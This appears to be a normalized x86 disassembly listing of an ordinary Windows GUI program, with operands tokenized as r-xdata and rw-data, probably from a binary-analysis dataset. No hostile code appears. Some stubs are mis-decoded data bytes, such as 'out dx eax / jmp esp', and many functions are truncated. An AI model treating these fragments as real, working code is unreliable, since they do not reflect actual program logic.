jmp sub_403a3c
sub_450062
jmp sub_403a3c
sub_450069
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450231
jmp sub_403a3c
sub_450238
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45030c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4504f9
jmp sub_403a3c
sub_450500
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4505f0
xor eax eax
retn
sub_450658
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44da78
sub_450786
jmp sub_403788
sub_4508bb
jmp sub_403a3c
sub_4508c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4508cc
jmp sub_403788
sub_4508d1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450e8c
jmp sub_403a3c
sub_450e93
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450e9c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_45139a
jmp sub_403a3c
sub_4513ec
push ebx
mov ebx eax
call sub_423af8
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44da78
pop ebx
retn
sub_451408
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44da78
retn
sub_45141c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44da78
retn
sub_45142c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44da78
retn
sub_4516d8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4533c8
pop esi
retn
sub_4517ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45183c
pop esi
retn
sub_451800
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_451928
pop esi
retn
sub_451814
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_451828
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45191b
jmp sub_403a3c
sub_451922
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4519b2
jmp sub_403a3c
sub_4519b9
pop ebx
pop ecx
pop ebp
retn
sub_4519c0
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_4519d0
retn
sub_4519d4
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4519f4
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_451b54
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_451c24
retn
sub_451d3c
jmp sub_403a3c
sub_451d43
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451e0e
jmp sub_403a3c
sub_451e38
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_451eca
jmp sub_403a3c
sub_45209c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_452340
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_45241c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44fe48
pop esi
retn
sub_4524e0
push esi
mov si 0xffc1
call sub_4034a4
pop esi
retn
sub_45250c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_452520
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_452534
call sub_44fe08
retn
sub_45253c
call sub_44fe08
retn
sub_452544
call sub_44fe08
retn
sub_4525ec
push ebx
mov ebx eax
mov eax ebx
call sub_44e494
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_424c70
mov dx 0xb009
mov eax ebx
call sub_44fe48
pop ebx
retn
sub_452750
call sub_44fe08
retn
sub_452758
call sub_44fe08
retn
sub_452760
call sub_44fe08
retn
sub_452768
call sub_44fe08
retn
sub_4527cc
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_452c62
jmp sub_403a3c
sub_452c69
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452d48
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_452eec
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44da78
retn
sub_452f8c
push ebx
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_452fa8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_453180
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4530b8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4531d8
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44da78
sub_4531f8
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44da78
sub_45321c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_453228
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44da78
sub_4532d4
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_453278
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4533b0
jmp sub_403a3c
sub_4533b7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4535d6
jmp sub_403a3c
sub_4535dd
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4536e4
call sub_44d848
retn
sub_453b32
jmp sub_403a3c
sub_453bc8
mov eax [ r-xdata ]
retn
sub_453d2f
jmp sub_403a3c
sub_453e40
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44da78
sub_453e60
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44da78
sub_454176
jmp sub_403a3c
sub_4542b8
test [ eax + 0x52 ] 0x4
setne al
retn
sub_454414
jmp sub_403a3c
sub_45441b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425444
retn
sub_454437
jmp sub_403a3c
sub_454444
retn
sub_454518
mov [ edx + 0xc ] 0xffffffff
retn
sub_454576
jmp sub_403a3c
sub_45457d
pop ecx
pop ecx
pop ebp
retn
sub_45461d
jmp sub_403a3c
sub_454624
pop ebx
mov esp ebp
pop ebp
retn
sub_454690
call sub_450610
retn
sub_454723
jmp sub_403a3c
sub_45472a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_454909
jmp sub_403a3c
sub_454910
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454a6c
push ebx
mov ebx eax
mov eax ebx
call sub_459f28
or edx 0xffffffff
mov eax ebx
call sub_454b98
pop ebx
retn
sub_454b44
jmp sub_403a3c
sub_454b98
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_454a84
sub_454d08
push ebx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_454d20
push ebx
mov ebx eax
mov eax ebx
call sub_459fe0
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_454e0c
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_451248
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_454ea7
jmp sub_403a3c
sub_454eae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454ed1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425444
retn
sub_454eca
jmp sub_403a3c
sub_454ed1
pop ebx
pop ecx
pop ebp
retn
sub_454ed8
retn
sub_454f40
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4552ad
jmp sub_403a3c
sub_455494
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_455680
jmp sub_403a3c
sub_455730
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_455744
inc [ eax + 0x6c ]
retn
sub_455748
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_456fc8
sub_4558a8
call sub_455fa8
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_456253
jmp sub_403a3c
sub_45625a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456277
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_456270
jmp sub_403a3c
sub_456277
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456558
jmp sub_403a3c
sub_45655f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45657c
mov eax [ ebp - 0x4 ]
call sub_425444
retn
sub_456575
jmp sub_403a3c
sub_45657c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456599
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_456592
jmp sub_403a3c
sub_456599
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456a4d
jmp sub_403a3c
sub_456a54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456bdf
jmp sub_403a3c
sub_456be6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456c9b
jmp sub_403a3c
sub_456ca2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456d90
jmp sub_403a3c
sub_456de1
jmp sub_403a3c
sub_456de8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4557b4
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_456ff0
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_4552f0
sub_4578f0
jmp sub_403a3c
sub_4578f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4579c0
call GetCapture
retn
sub_4579e4
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_457c4a
jmp sub_403a3c
sub_457e44
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_458058
jmp sub_403a3c
sub_45805f
pop ebx
mov esp ebp
pop ebp
retn
sub_4580aa
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_458127
jmp sub_403a3c
sub_45812e
pop ebp
retn
sub_4581b6
jmp sub_403a3c
sub_4581bd
pop ebp
retn
sub_458802
out dx eax
jmp esp
sub_458c50
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_418930
retn
sub_458c68
mov al 0x1
retn
sub_458c6c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_421378
retn
mov eax edx
retn
sub_458c7c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_421348
retn
mov al 0x1
retn
sub_458f80
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_458fbc
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_459220
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_459234
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_459248
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_45925c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_459270
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_459284
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_459298
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_4592ac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_4592c0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_4592d4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403434
pop ebx
retn
sub_4592e8
retn
sub_4592ec
retn
sub_4592f0
retn
sub_4592f4
retn
sub_4592f8
retn
sub_4592fc
retn
sub_459300
retn
sub_459304
retn
sub_459308
retn
sub_45930c
retn
sub_459310
retn
sub_459314
retn
sub_459620
jmp sub_403a3c
sub_459a6c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x90 ] eax
sub_459aec
push esi
mov si 0xffef
call sub_4034a4
pop esi
retn
sub_459bc9
jmp sub_403a3c
sub_459bd0
pop ebp
retn
sub_459bd4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
sub_459dfc
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_459fd5
jmp sub_403a3c
sub_459fdc
pop ebx
pop ecx
pop ebp
retn
sub_459fe0
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_459fe8
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45a250
sub_45a095
jmp sub_403a3c
sub_45a09c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4032a8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_45a1a4
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_45a2e3
jmp sub_403a3c
sub_45a2ea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a382
jmp sub_403a3c
sub_45a389
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a3a6
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_45a39f
jmp sub_403a3c
sub_45a3a6
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034a4
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a47d
jmp sub_403a3c
sub_45a4bb
jmp sub_403a3c
sub_45a4c2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034a4
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a6ef
jmp sub_403a3c
sub_45a6f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a713
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_45a70c
jmp sub_403a3c
sub_45a713
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45a78c
retn
sub_45a72c
jmp sub_403a3c
sub_45a77b
jmp sub_403a3c
sub_45a782
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a80b
jmp sub_403a3c
sub_45a812
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a818
or edx 0xffffffff
call sub_45a78c
retn
sub_45ac27
jmp sub_403a3c
sub_45ac2e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac4b
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_45ac44
jmp sub_403a3c
sub_45ac4b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac68
mov eax [ ebp - 0x4 ]
call sub_45b760
retn
sub_45ac61
jmp sub_403a3c
sub_45ac68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ae6c
jmp sub_403a3c
sub_45ae73
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ae78
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4034a4
sub_45ae90
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_41725c
pop ebx
retn
sub_45af34
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418778
sub_45b04b
jmp sub_403a3c
sub_45b052
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_45b068
jmp sub_403a3c
sub_45b37a
jmp sub_403a3c
sub_45b381
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b39e
mov eax [ ebp - 0x10 ]
call sub_4032a8
retn
sub_45b397
jmp sub_403a3c
sub_45b39e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b3bb
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_45b3b4
jmp sub_403a3c
sub_45b3bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b424
jmp sub_403a3c
sub_45b53d
jmp sub_403a3c
sub_45b55a
jmp sub_403a3c
sub_45b712
jmp sub_403a3c
sub_45b719
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b75c
inc [ eax + 0x5c ]
retn
sub_45b760
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4034a4
sub_45b7b4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_45b7f1
jmp sub_403a3c
sub_45b7f8
pop ebp
retn
sub_45b7fc
sub [ rw-data ] 0x1
retn
sub_45bb06
inc ebp
add ah ch
pop ss
inc edx
add [ eax ] dl
iretd
sub_45bb6e
inc ebp
add al bh
iretd
sub_45bc48
clc
push edx
push ecx
[ eax ]
sub_45c2c9
retn 0x45
sub_45c764
mov eax [ esp + 0x8 ]
retn
sub_45c76c
push ebx
mov ebx eax
call sub_45c764
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
jmp sub_403a74
sub_45c788
pop ebx
retn
sub_45ca01
jmp sub_403a3c
sub_45ca08
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cb53
jmp sub_403a3c
sub_45cb5a
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cb70
push ebx
mov eax [ rw-data ]
call sub_418e80
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418e3c
mov eax ebx
pop ebx
retn
sub_45ccf8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45cd14
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45d40f
jmp sub_403a3c
sub_45d416
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d50e
jmp sub_403a3c
sub_45d515
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d938
jmp sub_403a3c
sub_45d93f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45ddeb
jmp sub_403a3c
sub_45e28c
jmp sub_403a3c
sub_45e293
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e6f7
jmp sub_403a3c
sub_45ebb4
jmp sub_403a3c
sub_45ebbb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ef66
jmp sub_403a3c
sub_45ef6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ef7b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f128
mov eax [ r-xdata ]
retn
sub_45f164
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f178
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f188
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45f198
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_45f494
mov edx eax
sub_45f230
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov edx esi
call sub_45f1b0
pop esi
pop ebx
retn
sub_45f2ac
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_45f494
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_418930
mov ecx eax
sub_45f684
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45f6ec
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_45fa94
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45fac8
sub_45fac8
mov edx sub_45faa0
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_45cbf0
retn
sub_45fcb2
jmp sub_403a3c
sub_45fcb9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460150
jmp sub_403a3c
sub_46018f
jmp sub_403a3c
sub_460196
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460334
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_460470
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4034a4
pop esi
pop ebp
retn 0x8
sub_46048c
mov eax [ eax + 0x34 ]
call sub_45d6c4
retn
sub_460498
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4034a4
pop esi
retn
sub_4604d4
push ebx
mov ecx sub_4604ac
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45cbf0
pop ebx
retn
sub_460708
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_46071c
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_460851
jmp sub_403788
sub_460953
jmp sub_403a3c
sub_46097e
jmp sub_403a3c
sub_460985
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46099c
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_460b84
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4604d4
sub_460c04
jmp sub_403a3c
sub_460c48
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_460c60
push ebx
mov ebx eax
mov eax ebx
call sub_421398
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_460cb2
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4604d4
sub_460d28
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_460e71
jmp sub_403a3c
sub_460e78
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4610b8
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_4610c8
sub_46111c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_46112c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_46113c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_46114c
and edx 0x7f
mov dl [ edx + rw-data ]
